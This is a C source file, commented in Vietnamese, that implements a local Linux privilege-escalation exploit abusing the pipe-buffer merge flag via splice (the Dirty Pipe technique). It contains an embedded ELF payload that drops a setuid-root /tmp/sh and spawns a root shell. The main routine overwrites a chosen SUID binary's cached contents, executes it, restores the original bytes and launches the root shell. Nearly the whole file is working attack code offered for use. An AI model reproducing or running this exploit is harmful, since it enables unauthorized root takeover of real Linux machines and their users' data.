#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <stdint.h>
#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

// Mảng elfcode[] chứa một binary payload tinh vi kiểu "matryoshka doll" (lồng ghép nhiều tệp thực thi)
// Với elf đầu có chức năng như sau:
//   - Tạo một tệp nhị phân ELF mới với tên "/tmp/sh"
//   - Ghi mã nhị phân ELF thứ 2 vào tệp này
//   - Đặt quyền thực thi cho tệp này
//   - Thoát khỏi chương trình
//   fd = open("/tmp/sh", O_WRONLY | O_CREAT | O_TRUNC);
//   write(fd, elfcode, elfcode_len)
//   chmod("/tmp/sh", 04755)
//   close(fd);
//   exit(0);
//
// ELF thứ 2 là một tệp nhị phân ELF độc lập, có thể thực thi gọi shell với quyền root
//   setuid(0);
//   setgid(0);
//   execve("/bin/sh", ["/bin/sh", NULL], [NULL]);

u_char elfcode[] = {
    /*0x7f,*/ 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x48, 0x8d, 0x3d, 0x56, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0x41, 0x02,
    0x00, 0x00, 0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48,
    0x89, 0xc7, 0x48, 0x8d, 0x35, 0x44, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2,
    0xba, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0x0f,
    0x05, 0x48, 0xc7, 0xc0, 0x03, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d,
    0x3d, 0x1c, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0xed, 0x09, 0x00, 0x00,
    0x48, 0xc7, 0xc0, 0x5a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff,
    0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x2f, 0x74, 0x6d,
    0x70, 0x2f, 0x73, 0x68, 0x00, 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e,
    0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38,
    0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
    0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
    0x00, 0x00, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x69,
    0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x6a,
    0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x1b, 0x00, 0x00, 0x00,
    0x6a, 0x00, 0x48, 0x89, 0xe2, 0x57, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc0,
    0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00,
    0x00, 0x0f, 0x05, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00
};

static void prepare_pipe(int p[2]) {
    if (pipe(p)) abort(); // khởi tạo pipe và báo lỗi nếu khởi tạo không thành công
    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ); // lấy kích thước của pipe; 
    static char buffer[4096];

    /* thực hiện lắp đầy pipe; 
       mỗi pipe_buffer sẽ được gắn cờ PIPE_BUF_FLAG_CAN_MERGE */
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n;
        if (r > sizeof(buffer)) {
            n = sizeof(buffer);
        } else {
            n = r;
        }
        write(p[1], buffer, n); // ghi vào pipe
        r -= n;
    }
    /* xả pipe, giải phóng tất cả các pipe_buffer (nhưng
       vẫn để lại cờ được khởi tạo) */
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n;
        if (r > sizeof(buffer)) {
            n = sizeof(buffer);
        } else {
            n = r;
        }
        read(p[0], buffer, n); // đọc từ pipe
        r -= n;
    }
    /* pipe hiện đang trống, và nếu thêm một 
       pipe_buffer mới mà không khởi tạo trường "flags",  
       buffer này sẽ có thể được hợp nhất */
}

int hax(char *filename, long offset, uint8_t *data, size_t len) {
    const int fd = open(filename, O_RDONLY); // mở file với quyền đọc
    if (fd < 0) {
        perror("Mở file thất bại");
        return -1;
    }
    struct stat st;
    if (fstat(fd, &st)) {
        perror("Lấy thông tin file thất bại");
        return -1;
    }
    /* tạo pipe với tất cả các cờ được khởi tạo với
       PIPE_BUF_FLAG_CAN_MERGE */
    int p[2];
    prepare_pipe(p);
    /* splice một byte từ trước offset đã chỉ định vào pipe
       thao tác này sẽ thêm một tham chiếu đến page cache,
       nhưng do hàm copy_page_to_iter_pipe() không khởi tạo trường "flags",
       cờ PIPE_BUF_FLAG_CAN_MERGE vẫn được giữ nguyên */
    --offset; 
    ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
    if (nbytes < 0) {
        perror("splice thất bại");
        return -1;
    }
    if (nbytes == 0) {
        fprintf(stderr, "splice thất bại: không có dữ liệu nào đã được di chuyển\n");
        return -1;
    }
    /* ghi vào pipe sẽ không tạo một pipe_buffer mới, mà
       sẽ thay vào đó ghi vào page cache, vì cờ
       PIPE_BUF_FLAG_CAN_MERGE */
    nbytes = write(p[1], data, len);
    if (nbytes < 0) {
        perror("Ghi thất bại");
        return -1;
    }
    if ((size_t)nbytes < len) {
        fprintf(stderr, "Ghi thất bại: không có dữ liệu nào đã được di chuyển\n");
        return -1;
    }
    close(fd); // đóng file
    return 0;
}

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: %s <SUID>\n", argv[0]);
        return EXIT_FAILURE;
    }
    char *path = argv[1];
    uint8_t *data = elfcode;
    int fd = open(path, O_RDONLY); // mở file với quyền đọc
    uint8_t *original_bytes = malloc(sizeof(elfcode)); // cấp phát bộ nhớ cho original_bytes
    lseek(fd, 1, SEEK_SET); // di chuyển con trỏ file đến vị trí 1
    read(fd, original_bytes, sizeof(elfcode)); // đọc dữ liệu từ file vào original_bytes
    close(fd); // đóng file
    printf("[+] Đang chiếm quyền điều khiển nhị phân suid..\n");
    printf("[+] Đang thực hiện ghi đè dữ liệu..\n");
    if (hax(path, 1, elfcode, sizeof(elfcode)) != 0) { // gọi hàm hax để ghi đè dữ liệu
        fprintf(stderr, "Ghi đè thất bại\n");
        return EXIT_FAILURE;
    }
    printf("[+] Ghi đè thành công\n");
    system(path); // thực thi file đã ghi đè
    printf("[+] Đang khôi phục lại dữ liệu gốc..\n");
    if (hax(path, 1, original_bytes, sizeof(elfcode)) != 0) { // gọi hàm hax để khôi phục dữ liệu
        fprintf(stderr, "Khôi phục thất bại\n");
        return EXIT_FAILURE;
    }
    printf("[+] Khôi phục thành công\n");
    free(original_bytes); // giải phóng bộ nhớ đã cấp phát cho original_bytes
    printf("[+] Chạy shell với quyền root\n");
    system("/tmp/sh"); // gọi shell với quyền root
    return EXIT_SUCCESS;
}